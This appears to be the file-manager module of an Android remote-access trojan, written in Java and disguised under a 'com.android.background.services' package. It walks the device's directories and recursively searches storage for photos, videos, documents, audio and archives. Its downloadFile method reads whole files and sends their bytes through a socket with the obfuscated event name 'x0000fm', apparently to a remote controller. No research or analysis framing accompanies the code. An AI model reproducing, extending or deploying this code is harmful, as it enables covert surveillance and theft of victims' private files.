package com.android.background.services.helpers;

import android.util.Log;

import com.android.background.services.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.DecimalFormat;
import java.util.ArrayList;
import java.util.List;

public class FileManager {

    public static JSONArray walk(String path) {

        JSONArray values = new JSONArray();

        File dir = new File(path);

        if (!dir.canRead()) {
            Log.d("cannot", "inaccessible");
        }

        File[] list = dir.listFiles();

        try {
            if (list != null) {

                JSONObject parentObj = new JSONObject();

                parentObj.put("name", "../");
                parentObj.put("isDir", true);
                parentObj.put("path", dir.getParent());
                parentObj.put("size", "0");

                values.put(parentObj);

                for (File file : list) {

                    JSONObject fileObj = new JSONObject();

                    fileObj.put("name", file.getName());
                    fileObj.put("isDir", file.isDirectory());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("size", fileSizeFormatter(file.length()));

                    values.put(fileObj);

                }
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }


        return values;
    }

    public static void downloadFile(String path) {
        if (path == null)
            return;

        File file = new File(path);

        if (file.exists()) {

            int size = (int) file.length();
            byte[] data = new byte[size];
            try {
                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
                buf.read(data, 0, data.length);
                JSONObject object = new JSONObject();
                object.put("file", true);
                object.put("name", file.getName());
                object.put("buffer", data);
                IOSocket.getInstance().getIoSocket().emit("x0000fm", object);
                buf.close();
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }

    public static String fileSizeFormatter(long size) {
        if (size <= 0) return "?";
        final String[] units = new String[]{"B", "KB", "MB", "GB", "TB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return new DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    // Tìm kiếm tất cả file theo loại
    public static JSONArray searchFilesByType(String searchPath, String fileType) {
        JSONArray results = new JSONArray();
        List<File> foundFiles = new ArrayList<>();
        
        try {
            searchFilesRecursive(new File(searchPath), fileType, foundFiles);
            
            for (File file : foundFiles) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("isDir", false);
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("size", fileSizeFormatter(file.length()));
                fileObj.put("parentDir", file.getParent());
                results.put(fileObj);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return results;
    }

    // Tìm kiếm file theo tên
    public static JSONArray searchFilesByName(String searchPath, String searchText) {
        JSONArray results = new JSONArray();
        List<File> foundFiles = new ArrayList<>();
        
        try {
            searchFilesByNameRecursive(new File(searchPath), searchText.toLowerCase(), foundFiles);
            
            for (File file : foundFiles) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("isDir", file.isDirectory());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("size", fileSizeFormatter(file.length()));
                fileObj.put("parentDir", file.getParent());
                results.put(fileObj);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return results;
    }

    // Hàm đệ quy tìm kiếm file theo loại
    private static void searchFilesRecursive(File directory, String fileType, List<File> results) {
        if (!directory.exists() || !directory.canRead()) {
            return;
        }

        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    // Bỏ qua một số thư mục hệ thống để tăng tốc độ
                    String dirName = file.getName().toLowerCase();
                    if (!dirName.equals("android") && !dirName.equals("lost+found") && 
                        !dirName.equals("system") && !dirName.equals("proc")) {
                        searchFilesRecursive(file, fileType, results);
                    }
                } else {
                    if (matchesFileType(file.getName(), fileType)) {
                        results.add(file);
                    }
                }
            }
        }
    }

    // Hàm đệ quy tìm kiếm file theo tên
    private static void searchFilesByNameRecursive(File directory, String searchText, List<File> results) {
        if (!directory.exists() || !directory.canRead()) {
            return;
        }

        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    // Bỏ qua một số thư mục hệ thống để tăng tốc độ
                    String dirName = file.getName().toLowerCase();
                    if (!dirName.equals("android") && !dirName.equals("lost+found") && 
                        !dirName.equals("system") && !dirName.equals("proc")) {
                        searchFilesByNameRecursive(file, searchText, results);
                    }
                } else {
                    if (file.getName().toLowerCase().contains(searchText)) {
                        results.add(file);
                    }
                }
            }
        }
    }

    // Kiểm tra file có đúng loại không
    private static boolean matchesFileType(String fileName, String fileType) {
        String name = fileName.toLowerCase();
        
        switch (fileType) {
            case "images":
                return name.matches(".*\\.(jpg|jpeg|png|gif|bmp|tiff|tif|webp|svg|ico|raw|heic|heif)$");
            case "videos":
                return name.matches(".*\\.(mp4|avi|mov|wmv|flv|webm|mkv|m4v|3gp|mpg|mpeg|ts|vob|ogv|divx|xvid|rm|rmvb|asf|swf)$");
            case "documents":
                return name.matches(".*\\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|odt|ods|odp|md|log|csv|json|xml|html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1|zip|rar|7z|tar|gz|bz2)$");
            case "audio":
                return name.matches(".*\\.(mp3|wav|flac|aac|ogg|wma|m4a|aiff|au|ra|mid|midi)$");
            case "archives":
                return name.matches(".*\\.(zip|rar|7z|tar|gz|bz2|xz|lzma|arj|cab|iso|dmg)$");
            default:
                return false;
        }
    }
}
